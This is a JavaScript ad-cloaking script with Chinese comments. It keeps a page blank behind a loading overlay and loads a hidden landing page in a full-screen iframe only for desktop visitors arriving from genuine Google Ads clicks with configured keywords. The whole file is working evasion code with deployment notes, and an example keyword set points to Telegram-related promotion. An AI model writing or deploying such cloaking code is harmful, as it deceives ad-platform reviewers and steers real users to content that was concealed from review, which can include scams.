/**
 * ============================================================================
 * 斗篷（Cloak）投放脚本 · dp-2026/1
 * ----------------------------------------------------------------------------
 * 作用：对进入页面的流量做分流。
 *       页面默认被 .haoniuwlls 遮罩盖住（全屏空白 + Loading，样式来自外部 custom.css）；
 *       只有同时满足以下 3 个条件，才会把页面替换为目标落地页：
 *         1) URL 同时带有 kw + gclid + gad_campaignid（即来自 Google Ads 的真实点击）
 *         2) kw 命中 confArr 中配置的关键词
 *         3) 处于桌面环境（isDesktopLike() 返回 true）
 *       任一条件不满足 → 不处理，页面保持空白 + Loading。
 *
 * 依赖（缺一不可，详见同目录 README.md）：
 *   1) 页面需预先注入 .haoniuwlls 遮罩占位结构，见 辅助工具/通用注入代码.txt
 *   2) 需加载外部 custom.css 为 .haoniuwlls 提供全屏遮罩 + Loading 动画样式
 *   3) confArr 必须填入真实的 [关键词, 落地页URL]，当前仍是占位值，不可直接上线
 *
 * 执行时序：
 *   脚本加载 → DOMContentLoaded → 关卡 1 参数校验 → 关卡 2 关键词匹配
 *   → 关卡 3 桌面环境判定 → 全屏替换 iframe + 移除空白/Loading 遮罩
 *   （任一关卡不通过：不做任何处理，遮罩保持不动）
 * ============================================================================
 */

/* ----------------------------------------------------------------------------
 * 一、配置区（上线前必须核对/修改的内容集中在此）
 * -------------------------------------------------------------------------- */

// 遮罩层类名。必须与两处保持一致：
//   1) 辅助工具/通用注入代码.txt 中注入的 <ul class='haoniuwlls'>
//   2) 外部 custom.css 中 .haoniuwlls 的样式定义
var OVERLAY_CLASS = 'haoniuwlls';

// 当前访问的关键词：先取 URL 原始值，归一化后再用于匹配 confArr
var kw = '';

/* 关键词 → 落地页 映射表。
 * 结构：[0] = 关键词正则片段（会被 new RegExp 直接构造）， [1] = iframe 目标地址
 * ⚠️ 当前为占位值：pattern 'name' 几乎不可能命中 kw，且 'Link' 不是合法 URL，
 *    上线前必须替换为真实配置，例如：
 *    ['telegram|tg|飞机', 'https://xxx.example.com/lp/index.html']
 */
var confArr = [
  ['Name', 'Link'],
];

/* ----------------------------------------------------------------------------
 * 二、主流程：DOM 就绪后依次闯三道关卡，全部通过才切换页面
 *   关卡 1：URL 必须同时带 kw / gclid / gad_campaignid
 *   关卡 2：kw 必须命中 confArr 中配置的关键词
 *   关卡 3：必须处于桌面环境
 *   任一关卡不通过 → 直接返回，页面保持空白 + Loading
 * -------------------------------------------------------------------------- */
document.addEventListener('DOMContentLoaded', function () {
  var params = new URLSearchParams(window.location.search);

  // kw：广告关键词（用于匹配 confArr）；gclid + gad_campaignid：Google Ads 点击标识
  kw = params.get('kw');
  var gclid = params.get('gclid');
  var gadCampaignId = params.get('gad_campaignid');

  // 关卡 1：三个参数缺任意一个都不处理，页面保持空白 + Loading
  if (!kw || !gclid || !gadCampaignId) return;

  // 关键词归一化：统一小写 + 去掉所有空格，保证 'Air Pods' 与 'airpods' 能命中同一规则
  kw = kw.toLowerCase().replaceAll(' ', '');

  // 关卡 2：在 confArr 中查找首个命中关键词的配置，未命中直接返回
  // ⚠️ 未做正则转义：关键词中含 + ? ( ) [ ] 等元字符时会得到意外匹配结果甚至抛 SyntaxError
  var iframeUrl = null;
  for (var i = 0; i < confArr.length; i++) {
    if (new RegExp(confArr[i][0].toLowerCase()).test(kw)) {
      iframeUrl = confArr[i][1];
      break;
    }
  }
  if (!iframeUrl) return;

  // 关卡 3：仅桌面端处理；移动端直接返回，遮罩不会被移除，页面持续显示空白 + Loading
  if (!isDesktopLike()) return;

  // 三道关卡全部通过：全屏替换为目标页 iframe，并关闭全屏空白 + Loading 遮罩
  swapBodyToIframe(iframeUrl);

  // 必须真正移除遮罩，而不是把背景改成透明：
  // .haoniuwlls 是 position:fixed 覆盖全屏、且未设置 pointer-events:none，
  // 只置透明仍会拦截全部点击，导致页面看得见却点不动。
  var overlay = document.getElementsByClassName(OVERLAY_CLASS)[0];
  if (overlay) overlay.remove();
});

/**
 * 把整个页面替换为全屏 iframe，指向目标落地页（仅桌面端且通关后调用）。
 * 同时：改写 title 弱化页面标识，并重建 .haoniuwlls 占位结构（调用方随后会将其移除）。
 * ⚠️ 目标站若返回 X-Frame-Options: DENY/SAMEORIGIN 或 CSP frame-ancestors 限制，iframe 会白屏。
 * @param {string} url 目标落地页地址（来自 confArr[1]）
 */
function swapBodyToIframe(url) {
  document.title = 'site';
  document.body.innerHTML =
    '<iframe src="' + url + '" marginwidth="0" marginheight="0" align="middle" ' +
    'scrolling="auto" frameborder="0" style="width:100%;height:100vh"></iframe>' +
    '<ul class="' + OVERLAY_CLASS + '"></ul>';
}

/**
 * 是否类桌面环境。它是最后一道关卡：返回 true 才切换页面；
 * 返回 false（移动端）则不做任何处理，遮罩持续显示。
 * 判定依据：桌面系统存在任务栏/菜单栏等，availHeight 会小于 height；移动端两者一般相等。
 * ⚠️ 这是近似判断：任务栏自动隐藏、浏览器缩放、多屏、部分定制 ROM 都会影响结果；
 *    标准做法应使用 navigator.userAgentData.mobile 或 UA 判定。
 * @returns {boolean}
 */
function isDesktopLike() {
  return screen.height !== screen.availHeight;
}
